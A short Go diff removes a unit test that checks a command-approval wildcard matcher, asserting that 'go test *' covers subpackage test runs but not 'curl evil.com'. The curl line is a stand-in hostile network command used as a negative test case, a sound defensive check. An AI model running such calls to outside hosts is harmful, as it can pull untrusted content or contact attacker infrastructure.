@@ -79,13 +79,3 @@ func TestCommandApprovalWildcardContractFixtures(t *testing.T) {
 		}
 	}
 }
-
-func TestMatchCommandPatternPrefixWildcard(t *testing.T) {
-	t.Parallel()
-	if !settings.MatchCommandPattern("go test ./internal/...", "go test *") {
-		t.Fatal("go test * should match subpackages")
-	}
-	if settings.MatchCommandPattern("curl evil.com", "go test *") {
-		t.Fatal("go test * should not match curl")
-	}
-}
